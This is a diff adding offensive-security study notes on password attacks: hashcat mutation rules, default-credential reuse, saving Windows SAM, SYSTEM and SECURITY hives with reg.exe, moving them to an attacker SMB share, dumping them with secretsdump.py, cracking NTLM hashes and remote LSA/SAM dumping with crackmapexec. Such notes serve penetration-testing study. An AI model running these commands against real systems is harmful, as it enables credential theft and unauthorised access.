@@ -92,6 +92,112 @@ Then, we can connect with `smbclient`:
 zero@pio$ smbclient -U <USER> \\\\<TARGET>\\<SHARED FOLDER>
 ```
 
+## Passwords Mutations
+
+We can use rules to create stronger passwords list or adjust it to a password policy. For example, we can create a new password list from another list with the rules as:
+```console
+zero@pio$ hashcat --force <PASSWORD LIST> -r <RULE> --stdout | sort -u > <NEW LIST>
+```
+
+The rules list can be seen as:
+```
+:
+c
+so0
+c so0
+sa@
+c sa@
+c sa@ so0
+$!
+$! c
+$! so0
+$! sa@
+$! c so0
+$! c sa@
+$! so0 sa@
+$! c so0 sa@
+```
+
+This means:
+
+| **Character**   | **Description**    |
+|--------------- | --------------- |
+| `:` | Do nothing |
+| `l` | Lowercase all letters |
+| `u` |	Uppercase all letters |
+| `c` | Capitalize the first letter and lowercase others |
+| `sXY` | Replace all instances of X with Y |
+| `$!` | Add the exclamation character at the end |
+
+## Password Reuse
+
+It is important to check for common or defaults passwords. [Here](https://github.com/ihebski/DefaultCreds-cheat-sheet) are a cheatsheet with a bunch of them.
+
+---
+
+# Windows Password Attacks
+
+## SAM 
+
+### Copying SAM Registry Hives 
+
+There are three registry hives that we can copy if we have local admin access on the target:
+
+| **Registry Hive**   | **Description**    |
+|--------------- | --------------- |
+| `hklm\sam` | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
+| `hklm\system` | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. |
+| `hklm\security` | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. |
+
+We can create backups of these hives using `reg.exe`. For example:
+```console
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+```
+
+We only need **sam** and **system**, but **security** can included hashes associated with the cached domain.
+
+We can move the files with `smbserver.py`:
+```console
+zero@pio$ sudo smbserver.py -smb2support CompData /home/<USER>/Documents/
+```
+
+```console
+C:\> move sam.save \\<WIN IP>\CompData
+C:\> move security.save \\<WIN IP>\CompData
+C:\> move system.save \\<WIN IP>\CompData
+```
+
+### Dumping Hashes 
+
+For this we can use `secretsdump.py`. The usage is simple as:
+```console
+zero@pio$ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```
+
+### Cracking Hashes 
+
+Add all the hashes we want to crack to a file. Now we must run the `-m 1000` version of hashcat:
+```console
+zero@pio$ hashcat -m 1000 <HASH FILE> <WORDLIST>
+```
+
+### Remote Dumping & LSA Secrets 
+
+With access to credentials with **local admin privileges**, it is also possible for us to target LSA Secrets over the network:
+```console
+zero@pio$ crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --lsa
+```
+
+Or SAM:
+```console
+zero@pio$ crackmapexec smb <IP> --local-auth -u <USER> -p <PASSWORD> --sam
+```
+
+
 ---
 
 # Resources 
